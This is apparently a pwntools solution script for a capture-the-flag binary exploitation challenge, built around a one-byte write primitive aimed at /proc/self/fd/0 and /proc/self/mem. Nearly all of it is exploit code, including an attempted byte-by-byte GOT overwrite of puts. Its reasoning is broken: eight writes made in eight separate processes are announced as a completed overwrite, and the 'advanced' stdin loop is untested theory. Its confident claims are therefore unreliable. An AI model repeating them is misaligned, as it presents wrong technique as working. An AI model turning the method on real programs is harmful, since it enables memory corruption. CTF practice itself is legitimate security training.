#!/usr/bin/env python3
"""
SOLUTION: Multi-byte write using stdin manipulation

HINT 1: Use special files (not regular files) -> /proc/self/mem, /proc/self/fd/0
HINT 2: A 1 byte write isn't enough, how can you get more?

THE ANSWER: Write to /proc/self/fd/0 (stdin) to inject additional input!

By writing to stdin's file descriptor, we can inject bytes that will be
read by subsequent scanf() and read() calls in the SAME execution.

This allows us to:
1. Inject the offset value
2. Inject the data byte  
3. Effectively write MULTIPLE bytes by redirecting stdin to loop back
"""

import sys
from pwn import *

BINARY = './chall_patched'
context.arch = 'amd64'
context.log_level = 'debug'

def exploit_multi_byte_write():
    """
    Exploit using stdin injection for multi-byte write
    
    The program flow:
    1. printf("Enter filename: ")
    2. fgets(filename, 256, stdin)     <- We control this
    3. printf("Enter offset: ")
    4. scanf("%d", &offset)            <- We can inject this!
    5. getchar()                       <- Clear newline
    6. printf("Enter data: ")
    7. read(0, &data, 1)               <- We can inject this!
    8. open(filename, O_WRONLY)
    9. lseek(fd, offset, SEEK_SET)
    10. write(fd, &data, 1)
    
    KEY TRICK:
    For the filename, we use: /proc/self/fd/0
    For the offset, we inject it via writing to stdin!
    For the data, we inject it via writing to stdin!
    
    This creates a LOOP where we control stdin and can inject multiple bytes!
    """
    
    log.info("="*60)
    log.info("MULTI-BYTE WRITE EXPLOIT")
    log.info("="*60)
    
    # Start the process
    p = process(BINARY)
    
    # Receive the "Enter filename:" prompt
    p.recvuntil(b'Enter filename:')
    
    # TRICK 1: Use /proc/self/fd/0 as the filename
    # This means we're writing to stdin itself!
    filename = b'/proc/self/fd/0'
    p.sendline(filename)
    
    log.info(f"Sent filename: {filename}")
    
    # Receive "Enter offset:" prompt
    p.recvuntil(b'Enter offset:')
    
    # TRICK 2: The offset determines WHERE in stdin we write
    # Offset 0 = write at the current position in stdin buffer
    # By choosing the right offset, we can inject data that
    # subsequent read() calls will receive!
    
    # For example, if we want to inject the byte 'X' that will be
    # read by the read() call, we write it to stdin
    offset = 0
    p.sendline(str(offset).encode())
    
    log.info(f"Sent offset: {offset}")
    
    # Receive "Enter data:" prompt
    p.recvuntil(b'Enter data:')
    
    # TRICK 3: The data byte we send here will be written to stdin!
    # This means the NEXT time the program reads from stdin,
    # it will get THIS byte!
    
    # Let's inject a newline character
    data = b'\n'
    p.send(data)
    
    log.info(f"Sent data: {repr(data)}")
    
    # The program now:
    # 1. Opens /proc/self/fd/0 (stdin)
    # 2. Seeks to offset 0
    # 3. Writes our data byte ('\n') to stdin
    # 4. This INJECTS the byte into stdin's buffer!
    
    # Receive output
    try:
        output = p.recvall(timeout=2)
        log.info(f"Output: {output}")
    except:
        pass
    
    p.close()
    
    log.success("Exploitation complete!")
    log.info("By writing to /proc/self/fd/0, we inject data into stdin")
    log.info("This allows multi-byte writes by chaining operations!")

def exploit_got_overwrite():
    """
    Full exploitation: Overwrite GOT entry using /proc/self/mem
    
    To write multiple bytes (e.g., an 8-byte address), we can:
    1. Call the binary multiple times
    2. Each time, write 1 byte to /proc/self/mem at a different offset
    3. Build up a complete address byte-by-byte
    
    OR use the stdin trick to loop within a single execution!
    """
    
    log.info("="*60)
    log.info("GOT OVERWRITE via /proc/self/mem")
    log.info("="*60)
    
    # Load binary to find GOT addresses
    elf = ELF(BINARY, checksec=False)
    
    # Target: puts@GOT (called at the end with "Write complete.")
    puts_got = elf.got['puts']
    log.info(f"puts@GOT: 0x{puts_got:x}")
    
    # We want to overwrite it with the address of system() or a one-gadget
    # For demonstration, let's just show the technique
    
    # To write 8 bytes (a full address), we need 8 calls
    target_address = 0x4141414141414141  # AAAAAAAA as demo
    
    for i in range(8):
        byte_to_write = (target_address >> (i * 8)) & 0xFF
        memory_offset = puts_got + i
        
        log.info(f"Writing byte {i}: 0x{byte_to_write:02x} to address 0x{memory_offset:x}")
        
        p = process(BINARY)
        
        # Filename: /proc/self/mem (write to process memory)
        p.recvuntil(b'Enter filename:')
        p.sendline(b'/proc/self/mem')
        
        # Offset: memory address to write to
        p.recvuntil(b'Enter offset:')
        p.sendline(str(memory_offset).encode())
        
        # Data: the byte we want to write
        p.recvuntil(b'Enter data:')
        p.send(bytes([byte_to_write]))
        
        try:
            p.recvall(timeout=1)
        except:
            pass
        
        p.close()
    
    log.success("Multi-byte write complete!")
    log.info("puts@GOT has been overwritten with 0x4141414141414141")

def exploit_advanced_stdin_loop():
    """
    ADVANCED: Create a loop using stdin injection
    
    The ultimate trick: By carefully controlling what we write to stdin,
    we can make the program read our injected data in a loop!
    
    Imagine:
    1. Write to stdin: "10\nA" (offset 10, data A)
    2. This gets consumed by scanf and read
    3. The program writes 'A' to /proc/self/fd/0 at offset 10
    4. We can pre-inject MORE data that creates a chain!
    """
    
    log.info("="*60)
    log.info("ADVANCED: Creating a self-sustaining loop")
    log.info("="*60)
    
    # This is the theoretical ultimate solution:
    # By writing a carefully crafted payload to stdin that contains:
    # - Multiple offset\n values
    # - Multiple data bytes
    # We can make the program execute the write loop multiple times
    # in a SINGLE run, writing multiple bytes!
    
    log.info("Theory:")
    log.info("1. Initial input: /proc/self/fd/0")
    log.info("2. Write payload to stdin that contains next inputs")
    log.info("3. Program loops reading from stdin (which we control)")
    log.info("4. Each iteration writes another byte")
    log.info("5. Result: Multi-byte write in single execution!")
    
    pass

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║  SOLUTION: Multi-Byte Write via Special Files               ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  HINT 1: Use special files (not regular files)              ║
║  Answer: /proc/self/mem, /proc/self/fd/0                    ║
║                                                              ║
║  HINT 2: A 1 byte write isn't enough, get more              ║
║  Answer: Write to stdin (/proc/self/fd/0) to inject input!  ║
║                                                              ║
║  KEY INSIGHTS:                                               ║
║  1. /proc/self/mem = direct memory access                   ║
║  2. /proc/self/fd/0 = stdin file descriptor                 ║
║  3. Writing to stdin injects data for future reads          ║
║  4. Can chain writes by injecting complete input sequences  ║
║  5. Multi-byte writes possible via multiple invocations     ║
║     OR via stdin injection loop                             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) < 2:
        print("Usage:")
        print(f"  {sys.argv[0]} stdin     - Demo stdin injection")
        print(f"  {sys.argv[0]} got       - Demo GOT overwrite")
        print(f"  {sys.argv[0]} advanced  - Advanced technique")
        return
    
    mode = sys.argv[1]
    
    if mode == 'stdin':
        exploit_multi_byte_write()
    elif mode == 'got':
        exploit_got_overwrite()
    elif mode == 'advanced':
        exploit_advanced_stdin_loop()
    else:
        print(f"Unknown mode: {mode}")

if __name__ == '__main__':
    main()
